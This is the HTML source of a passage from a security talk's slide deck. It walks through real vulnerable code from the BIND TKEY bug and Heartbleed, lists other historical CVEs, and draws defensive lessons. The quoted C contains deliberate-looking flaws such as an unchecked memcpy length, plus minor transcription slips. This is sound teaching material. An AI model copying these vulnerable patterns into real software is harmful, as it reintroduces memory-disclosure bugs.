      return (ISC_R_SUCCESS);
      
  failure:
      if (freetkeyin)
          dns_rdata_freestruct(&tkeyin);
      if (!ISC_LIST_EMPTY(namelist))
          free_namelist(msg, &namelist);
      return (result);
}</code></pre>
        <aside>
          <ul>
            <li>This is the TKEY query processing implementation</li>
            <li>Takes a request for a key, tries to find the key, sends a response back with it, if you're allowed it</li>
            <li>It's quite complicated. It's also broken</li>
            <li>How would you start trying to audit this? Any idea where the catastrophic bug is?</li>
          </ul>
        </aside>
      </section>
      <section>
        <pre style="font-size: 80%; width: 100%; margin: 0"><code class="language-c">/*
 * Look for a TKEY record that matches the question.
 */
tkeyset = NULL;
name = NULL;
result = dns_message_findname(msg, DNS_SECTION_ADDITIONAL, qname,
                              dns_rdatatype_tkey, 0, &name, &tkeyset);
if (result != ISC_R_SUCCESS) {
    /*
     * Try the answer section, since that's where Win2000
     * puts it.
     */
    if (dns_message_findname(msg, DNS_SECTION_ANSWER, qname
                             dns_rdatatype_tkey, 0, &name,
                             &amp;tkeyset) != ISC_R_SUCCESS) { 
    &nbsp;&nbsp;&nbsp;&nbsp;result = DNS_R_FORMERR;
        tkey_log("dns_tkey_processquery: couldn't find a TKEY "
                 "matching the question");
        goto failure;
    }
}</code></pre>
        <aside>
          <ul>
            <li>Let's make it easier. It's in this bit, where we go find the record</li>
            <li>Any idea?</li>
            <li>Here we've got a request for a TKEY record with a certain name</li>
            <li>We look in the ADDITIONAL section for record names, and search for those in all our TKEY data</li>
            <li>If that fails, we look in the ANSWER section of the requestm because that's what Win2000 incorrectly does</li>
          </ul>
        </aside>
      </section>
      <section>
        <pre style="font-size: 80%; width: 100%; margin: 0"><code class="language-c">dns_message_findname(dns_message_t *msg, dns_section_t section,
                     dns_name_t *target, dns_rdatatype_t type,
                     dns_rdatatype_t covers, dns_name_t **name,
                     dns_rdataset_t **rdataset)
{
  dns_name_t *foundname;
  isc_result_t result;
  
  /*
   * XXX These requirements are probably too intensive, especially
   * where things can be NULL, but as they are they ensure that if
   * something is NON-NULL, indicating that the caller expects it
   * to be filled in, that we can in fact fill it in.
   */
  REQUIRE(msg != NULL);
  REQUIRE(VALID_SECTION(section));
  REQUIRE(target != NULL);
  if (name != NULL) REQUIRE(*name == NULL);
  if (type == dns_rdatatype_any) {
    REQUIRE(rdataset == NULL);
  } else {
    if (rdataset != NULL) REQUIRE(*rdataset == NULL);
  }
  
  result = findname(&foundname, target,
                    &msg->sections[section]);
                    
  if (result == ISC_R_NOTFOUND)
    return (DNS_R_NXDOMAIN);
  else if (result != ISC_R_SUCCESS)
    return (result);
    
  if (name != NULL)
    *name = foundname;
    
  /*
   * And now look for the type.
   */
  if (type == dns_rdatatype_any)
    return (ISC_R_SUCCESS);
    
  result = dns_message_findtype(foundname, type, covers, rdataset);
  if (result == ISC_R_NOTFOUND)
    return (DNS_R_NXRRSET);
    
  return (result);
}</code></pre>
        <aside></aside>
      </section>
      <section data-bespoke-state="solution-slide">
        <h2 class="full-slide">Avoid<br>Complexity</h2>
        <aside>
          <ul>
            <li>This is all really complicated</li>
            <li>You think it's hard to follow, imagine trying to explain it</li>
            <li>DNS is a complicated system</li>
            <li>BIND tries to support all of it in every case all the time though</li>
            <li>137 RFCs listed on their site, as their 'spec'. Plus workarounds, patches, their own features, etc</li>
            <li>TSIG and TKEY are not important features in many cases.</li>
            <li>Support for Windows 2000 sending you updates even less so (~0.01% market share, end of life 5 years ago)</li>
            <li>Complexity makes things like this hard to remove</li>
            <li>Should all definitely be disablable, probably external plugins</li>
            <li></li>
            <li>Generally smacks of control plane/data plane confusion</li>
            <li>Cloudflare DNS proxy solves, interestingly: doesn't allow updates.</li>
            <li>Why on earth would you tie updates to the core structure of the internet directly to the most basic lookup operation of the entire internet?</li>
            <li></li>
            <li>Found by fuzzer by security researcher</li>
            <li>Could've been absolutely catastophic</li>
            <li></li>
            <li>Prefer systems that are implemented and structured simply internally</li>
            <li>Aim for that too, whether you're building your own or major tool code</li>
            <li>Prefer systems that do what you need, and no more</li>
            <li>Less is more</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="topic-slide">
        <h4>Nothing is really secure, but</h4>
        <h2 class="full-slide">Don't Panic</h2>
        <h3 class="conclusions">
          <ul>
            <li>Be ready to update</li>
            <li>Fear user input</li>
            <li>Value best practices</li>
            <li>Keep errors secret</li>
            <li>Isolate your components</li>
            <li>Avoid complexity</li>
          </ul>
        </h3>
        <aside>
          <ul>
            <li>If nothing else, watch for security notices, be ready to update <em>fast</em></li>
            <li>Be very cautious around user input. Lots of risk that's easily missed.</li>
            <li>Pay attention to software development best practices, especially testing etc</li>
            <li>Consider the real cost of features. Turn off or limit unnecessary features where possible</li>
            <li>Isolate your components from one another, and the world</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="topic-slide">
        <h2>OpenSSL</h2>
        <h4>Heartbleed (CVE-2014-0160)</h4><img src="images/heartbleed.svg" height="350">
        <aside>
          <ul>
            <li>You've heard lots about this already, I'm sure, so I'll be brief</li>
            <li>Heartbleed notably hits every box I've talked about</li>
            <li>The core bug is a failure to validate <strong>user input</strong></li>
            <li>The OpenSSL code and management has some major problems</li>
            <li>Writing their own malloc: definitely not <strong>best practice</strong></li>
            <li>Heartbeat <strong>feature</strong> itself isn't actually that useful to most people</li>
            <li><strong>Isolation</strong> could definitely limit the damage</li>
            <li>Terminate your SSL elsewhere allowed you to isolate at least some of your risk</li>
            <li>Could lose SSL certs, but no server-side only data (API keys, DB access, admin logins)</li>
          </ul>
        </aside>
      </section>
      <section>
        <h2>OpenSSL      </h2>
        <h4>Heartbleed (CVE-2014-0160)</h4>
        <pre><code class="language-c">buffer = OPENSSL_malloc(1 + 2 + payload + padding);
bp = buffer;

*bp++ = TLS1_HB_RESPONSE;
s2n(payload, bp);
memcpy(bp, pl, payload);</code></pre>
        <aside>
          <ul>
            <li>Allocates memory for response</li>
            <li>Payload and padding here are the lengths, not the data, confusingly</li>
            <li>Makes bp, a pointer within buffer, initially at the start</li>
            <li>Writes a header of response type and payload length into bp</li>
            <li>Copies payload bytes into bp too from pl (request payload buffer). But never checks length</li>
            <li></li>
            <li>Trusts user input</li>
            <li>Not best practices: opensslrampage.org, malloc reimplemented because they could do it better, but made Heartbleed less detectable</li>
            <li>Errors aren't the issue, but general lack of consideration of info exposure: no real need to send back data at all</li>
            <li>Could be handled better through isolation of SSL termination. Have a proxy that terminates SSL, passes plain through, only proxy vulnerable</li>
            <li>Generally complex, poor naming choices, and again a feature nobody uses: SSL heartbeat for keepalive. 2012 RFC. Most protocols that would use it provide higher level keep-alives anyway</li>
            <li>Updating the only answer. Anybody not ready to update strongly advised to shut their servers down asap until they could.</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="topic-slide">
        <h2>The also-rans:</h2>
        <ul>
          <li><span class='highlight'>Node.JS</span>: Cross-request header stealing <br/>(CVE-2012-2330)</li>
          <li><span class='highlight'>Python</span>: Remote code execution via builtin socket receive function <br/>(CVE-2014-1912)</li>
          <li><span class='highlight'>GCC</span>: Optimizations remove checks required to avoid overflow exploits<br/>(CVE-2009-1897)</li>
          <li><span class='highlight'>WebSockets</span>: Security bug in initial spec, when used with caching proxies</li>
          <li><span class='highlight'>SSL/TLS</span>: BEAST/CRIME/BREACH attacks against SSL and TLS<br/>(CVE-2011-3389, CVE-2012-4929, CVE-2013-3587)</li>
          <li><span class='highlight'>MongoDB</span>: Overflow exploits, crashing servers with a single request <br/>(CVE-2012-6619, CVE-2013-2132)</li>
          <li><span class='highlight'>RubyGems</span>: YAML exploit gave an external user full access to the repo</li>
          <li><span class='highlight'>NPM</span>: Full disk exposure on NPM server with a maliciously crafted URL</li>
        </ul>
        <aside>
          <ul>
            <li>There's a lot of these, not hard finding options to talk about.</li>
            <li>4,500 so far in 2015, 711 9+ out of 10.</li>
            <li>9+ generally means terrible consequences, easy to attack, widely relevant, not a special case</li>
          </ul>
        </aside>
      </section>
      <section data-bespoke-state="topic-slide">
        <h1 class="title">Your Web Stack Would Betray You In An Instant</h1>
        <address class="vcard">
          <div class="author fn">Tim Perry</div>
          <div class="urls"><span><a href="http://twitter.com/pimterry" rel="me" class="nickname url">@pimterry</a></span></div>
          <div class="note bio"><span>Tech Lead &amp; Open-Source Champion at&nbsp;</span><span class="org vcard"><a href="http://softwire.com" rel="group" class="org fn url">Softw<span class="i">i</span>re</a></span></div>
        </address>
        <aside>
          <ul>
            <li>We're recruiting!</li>
            <li>Follow me on twitter for slides</li>
          </ul>
        </aside>
      </section>
    </article>
    <!-- build:js scripts/scripts.js-->
    <script src="bower_components/bespoke.js/dist/bespoke.js"></script>
    <script src="bower_components/bespoke-keys/dist/bespoke-keys.min.js"></script>
    <script src="bower_components/bespoke-touch/dist/bespoke-touch.min.js"></script>
    <script src="bower_components/bespoke-scale/dist/bespoke-scale.min.js"></script>
    <script src="bower_components/bespoke-hash/dist/bespoke-hash.min.js"></script>
    <script src="bower_components/bespoke-state/dist/bespoke-state.min.js"></script>
    <script src="bower_components/bespoke-convenient/dist/bespoke-convenient.js"></script>
    <script src="bower_components/bespoke-indexfinger/dist/bespoke-indexfinger.js"></script>
    <script src="bower_components/bespoke-secondary/dist/bespoke-secondary.js"></script>
    <script src="scripts/bespoke-bullets.js"></script>
    <script src="bower_components/prism/prism.js"></script>
    <script src="bower_components/prism/components/prism-ruby.js"></script>
    <script src="bower_components/prism/components/prism-php.js"></script>
    <script src="bower_components/prism/components/prism-c.js"></script>
    <script src="bower_components/prism/components/prism-bash.js"></script>
    <script src="scripts/prism-yaml.js"></script>
    <script src="scripts/main.js"></script>
    <!-- endbuild-->
  </body>
</html>